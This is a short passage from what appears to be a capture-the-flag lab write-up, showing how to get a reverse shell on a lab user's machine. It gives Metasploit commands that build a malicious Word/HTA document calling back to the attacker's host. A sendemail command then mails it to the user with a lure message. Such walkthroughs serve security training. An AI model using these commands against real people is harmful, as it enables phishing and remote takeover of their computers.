# Getting the reverse shell with Metasploit

There is a way to get a meterpreter shell from _Nico_ by generating the HTA file with a Metasploit module.

```markdown
msfconsole

use exploit/windows/fileformat/office_word_hta
set SRVHOST 10.10.14.23
run
```

This creates the file _/root/.msf4/local/msf.doc_ that we can send to the email address of Nico and after he checks it, we get a meterpreter shell back.

```markdown
sendemail -f test@megabank.com -t nico@megabank.com -u RTF -m "Please look at this file" -a /root/.msf4/local/msf.doc -s 10.10.10.77
```
